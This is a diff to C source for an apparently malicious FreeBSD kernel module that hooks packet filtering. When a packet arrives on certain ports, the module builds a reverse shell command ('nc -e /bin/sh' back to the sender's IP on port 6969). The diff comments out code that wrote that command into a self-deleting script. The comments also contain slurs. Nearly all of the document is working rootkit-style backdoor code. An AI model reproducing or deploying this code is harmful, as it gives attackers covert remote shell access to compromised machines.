@@ -27,9 +27,9 @@
 #define TRIGGER_PORT 6969
 
 
-static int attacker_ports[] = {22, 80, 443, 8080, 21, 42069, 80085, 69, 420, 2200}; // List of target ports
+static int attacker_ports[] = {22, 80, 443, 8080, 21, 42069, 69, 420, 2200}; // List of target ports
 
-// u ret this is no allowed bruv
+// u ret this is no allowed bruv, nevermind yes it is, not called execve tho its jsut kern_exec(args)
 // int kern_execve(struct thread *td, struct execve_args *uap);
 
 
@@ -102,17 +102,6 @@ static pfil_return_t packet_filter(struct mbuf **mp, struct ifnet *ifp, int dir,
         for (i = 0; i < sizeof(attacker_ports) / sizeof(int); i++) {
             if (ntohs(tcp_header->th_dport) == attacker_ports[i]) {
 
-
-
-                // this is where we are having issues!!
-                // this is where we are having issues!!
-                // this is where we are having issues!!
-                // this is where we are having issues!!
-                // just read a damn book reatard
-
-
-
-
                 // Extract attacker IP and store as a string (since inet_ntoa() isn't available in kernel space)
                 char attacker_ip_str[16];
                     snprintf(attacker_ip_str, sizeof(attacker_ip_str), "%u.%u.%u.%u",
@@ -121,60 +110,42 @@ static pfil_return_t packet_filter(struct mbuf **mp, struct ifnet *ifp, int dir,
                     (ntohl(ip_header->ip_src.s_addr) >> 8) & 0xFF,
                     ntohl(ip_header->ip_src.s_addr) & 0xFF);
 
-
-                // Try this if the above gives issues
-                // char attacker_ip_str[16];
-                //     ksprintf(attacker_ip_str, "%u.%u.%u.%u",
-                //     (ntohl(ip_header->ip_src.s_addr) >> 24) & 0xFF,
-                //     (ntohl(ip_header->ip_src.s_addr) >> 16) & 0xFF,
-                //     (ntohl(ip_header->ip_src.s_addr) >> 8) & 0xFF,
-                //     ntohl(ip_header->ip_src.s_addr) & 0xFF);
-
-
                 // Construct the reverse shell command
                 char reverse_shell_cmd[100];
                 snprintf(reverse_shell_cmd, sizeof(reverse_shell_cmd),
                     "nc -e /bin/sh %s 6969", attacker_ip_str);
 
-
                 printf("[LKM] Triggering reverse shell to %s on port 6969\n", attacker_ip_str);
-               
-
-
-
-
-                  // File path to create
-                char *filepath = "/lkm_trigger.sh";
-
-                // Initialize nameidata for file creation
-                NDINIT(&nd, LOOKUP, NOFOLLOW, UIO_SYSSPACE, filepath, curthread);
-                error = vn_open(&nd, O_CREAT | O_WRONLY, 0600);
-                if (error) {
-                    printf("[LKM] Failed to create file %s\n", filepath);
-                    return PFIL_PASS;
-                }
-
-                vp = nd.ni_vp;
-                VOP_UNLOCK(vp, 0);
-
-                // Write contents to file
-                char file_content[200];
-                // can't use snprintf retard.
-                snprintf(file_content, sizeof(file_content),
-                    "#!/bin/sh\n%s\nrm -- \"$0\"\n", reverse_shell_cmd);
-
-                error = vn_rdwr(UIO_WRITE, vp, file_content, strlen(file_content),
-                    0, UIO_SYSSPACE, IO_NODELOCKED | IO_UNIT, curthread->td_ucred, NOCRED, NULL);
                 
-                if (error) {
-                    printf("[LKM] Failed to write to file %s\n", filepath);
-                }
 
-                // Close file
-                vn_close(vp, FWRITE, curthread->td_ucred, curthread);
-                
-                printf("[LKM] File %s created successfully\n", filepath);
-                break; // Stop after the first match
+
+
+
+                //   // File path to create
+                // char *filepath = "/lkm_trigger.sh";
+                // // Initialize nameidata for file creation
+                // NDINIT(&nd, LOOKUP, NOFOLLOW, UIO_SYSSPACE, filepath, curthread);
+                // error = vn_open(&nd, O_CREAT | O_WRONLY, 0600);
+                // if (error) {
+                //     printf("[LKM] Failed to create file %s\n", filepath);
+                //     return PFIL_PASS;
+                // }
+                // vp = nd.ni_vp;
+                // VOP_UNLOCK(vp, 0);
+                // // Write contents to file
+                // char file_content[200];
+                // // can't use snprintf retard.
+                // snprintf(file_content, sizeof(file_content),
+                //     "#!/bin/sh\n%s\nrm -- \"$0\"\n", reverse_shell_cmd);
+                // error = vn_rdwr(UIO_WRITE, vp, file_content, strlen(file_content),
+                //     0, UIO_SYSSPACE, IO_NODELOCKED | IO_UNIT, curthread->td_ucred, NOCRED, NULL);
+                // if (error) {
+                //     printf("[LKM] Failed to write to file %s\n", filepath);
+                // }
+                // // Close file
+                // vn_close(vp, FWRITE, curthread->td_ucred, curthread);
+                // printf("[LKM] File %s created successfully\n", filepath);
+                // break; // Stop after the first match
             }
         }
     }
